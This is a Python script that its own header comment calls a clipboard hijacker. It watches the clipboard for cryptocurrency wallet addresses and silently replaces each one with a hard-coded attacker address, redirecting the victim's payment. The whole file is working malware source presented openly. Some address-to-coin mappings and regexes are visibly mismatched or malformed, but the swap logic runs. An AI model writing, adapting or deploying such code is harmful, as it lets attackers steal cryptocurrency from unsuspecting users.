# A clipboard-monitoring script that detects cryptocurrency wallet addresses and silently replaces them with attacker-controlled addresses to intercept transactions.

import pyperclip
import re
import time
import logging
from threading import Thread

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger()

REPLACEMENT_ADDRESSES = {
    'bitcoin_legacy': '1CPaziTqeEixPoSFtJxu74uDGbpEAotZom',
    'segwit': '0xe356157b349C6E9B32AB05dEF47D964B49d927Bb',
    'native_segwit': 'ltc1qxc9njjzs7vqtcuq4gvt9n50epnhfpx3gs42sys',
    'wallet': 'DDu9NSm5C2UxRsV7UZDwEJC1koaWGp3xWd',
    'taproot': 'HhFv6nUSxwNUF9WquzNdCa5b8mRGHko9zJaGqvAPbwdP',
    'ethereum': 'XmRdqUMm69wrBV4LrQDb2Pjv3qeKNVQU2F',
    'litecoin_legacy': '1AqgU7Rsxe9YxXrE4Zs8KvTZzsqgEmQQd6',
    'litecoin_segwit': 'ltc1qr07zu594qf63xm7l7x6pu3a2v39m2z6hh5pp4t',
    'dogecoin': 'DQ2p5Zm65s7e5hQJth4xvG9kpLZKf7yHvT',
    'ripple': 'rEhpFEeb2iybw5Am6zwUu4dFtoLkxtnyX9F',
    'dash': 'Xpv2CZpNo4AnSo9D6tkeZjDdYv39m37Q51',
}

CRYPTO_REGEX = {
    'bitcoin_legacy': re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'),
    'segwit': re.compile(r'^[2-9A-HJ-NP-Za-km-z]{42}$'),
    'native_segwit': re.compile(r'^[bc1][a-z0-9]{42,59}$'),
    'wallet': re.compile(r'^bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l5l4k5]{39,87}$'),
    'taproot': re.compile(r'^bc1p[qpzry9x8gf2tvdw0s3jn54khce6mua7l5l4k5]{62,64}$'),
    'ethereum': re.compile(r'^0x[a-fA-F0-9]{40}$'),
    'litecoin_legacy': re.compile(r'^[LM3][A-Za-z0-9]{26,33}$'),
    'litecoin_segwit': re.compile(r'^ltc1[a-z0-9]{39,59}$'),
    'dogecoin': re.compile(r'^[D9][A-Za-z0-9]{33}$'),
    'ripple': re.compile(r'^r[a-zA-Z0-9]{25,35}$'),
    'dash': re.compile(r'^[X7][A-Za-z0-9]{33}$'),
}

def is_valid_crypto_address(address):
    address = address.strip()
    logger.debug(f"Checking address: {address}")

    for crypto_type, regex in CRYPTO_REGEX.items():
        if regex.match(address):
            logger.debug(f"Address matches {crypto_type}: {address}")
            return crypto_type
    return None

def monitor_clipboard():
    previous_clipboard = None
    
    while True:
        try:
            clipboard_content = pyperclip.paste().strip()
            logger.debug(f"Clipboard content: '{clipboard_content}'")

            if clipboard_content == previous_clipboard or not clipboard_content:
                time.sleep(1)
                continue

            crypto_type = is_valid_crypto_address(clipboard_content)
            if crypto_type:
                replacement_address = REPLACEMENT_ADDRESSES.get(crypto_type)
                if replacement_address:
                    pyperclip.copy(replacement_address)
                    print(f"Address replaced: {clipboard_content} -> {replacement_address}")
                    previous_clipboard = clipboard_content
            else:
                previous_clipboard = clipboard_content

            time.sleep(0.2)
        except pyperclip.PyperclipException as e:
            logger.error(f"Clipboard error: {e}")
            time.sleep(1)
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            time.sleep(1)

def start_clipboard_monitoring():
    clipboard_thread = Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()

if __name__ == '__main__':
    start_clipboard_monitoring()

    while True:
        time.sleep(1)
